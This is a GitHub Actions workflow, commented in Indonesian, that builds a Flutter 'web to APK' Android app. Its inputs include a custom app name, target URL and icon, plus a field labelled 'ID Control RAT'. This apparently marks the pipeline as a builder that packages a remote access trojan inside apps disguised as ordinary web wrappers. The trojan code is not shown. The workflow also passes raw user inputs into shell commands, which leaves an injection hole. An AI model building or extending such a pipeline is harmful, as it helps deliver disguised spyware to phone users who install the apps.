name: Build Web to APK

on:
  workflow_dispatch:
    inputs:
      app_name:
        description: 'Nama Aplikasi'
        required: false
        default: ''
      target_url:
        description: 'URL Target'
        required: false
        default: ''
      control_id:
        description: 'ID Control RAT'
        required: false
        default: ''
      icon_url:
        description: 'URL Icon APK'
        required: false
        default: ''

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      - name: Setup Java JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Setup Flutter
        uses: subosito/flutter-action@v2
        with:
          channel: 'stable'
          cache: true

      # 🆕 WAJIB: Bikin folder android otomatis
      - name: Create Android Folder
        run: flutter create . --platforms=android

      # 🆕 Inject config manual HANYA kalau input diisi
      - name: Inject Config (Manual Only)
        if: ${{ github.event.inputs.app_name != '' }}
        run: |
          mkdir -p assets
          cat <<EOF > assets/config.json
          {
            "app_name": "${{ github.event.inputs.app_name }}",
            "target_url": "${{ github.event.inputs.target_url }}",
            "control_id": "${{ github.event.inputs.control_id }}",
            "icon_url": "${{ github.event.inputs.icon_url }}"
          }
          EOF
          echo "✅ Config injected from manual input"

      # 🆕 Verify config aman (kalau file gak ada, bikin kosong)
      - name: Verify Config
        run: |
          mkdir -p assets
          if [ ! -f assets/config.json ]; then
            echo "{}" > assets/config.json
            echo "⚠️ Config tidak ada, bikin kosong"
          fi
          echo "📄 Current config.json:"
          cat assets/config.json

      # 🆕 Download icon manual (kalau ada)
      - name: Download Custom Icon
        if: ${{ github.event.inputs.icon_url != '' }}
        run: |
          mkdir -p assets
          curl -L -o assets/icon.png "${{ github.event.inputs.icon_url }}"
          echo "✅ Icon downloaded"

      # Get dependencies
      - name: Get Dependencies
        run: flutter pub get

      # Build APK
      - name: Build APK Release
        run: flutter build apk --release

      # Upload APK
      - name: Upload APK Artifact
        uses: actions/upload-artifact@v4
        with:
          name: web2apk-${{ github.run_id }}
          path: build/app/outputs/flutter-apk/app-release.apk
          retention-days: 7
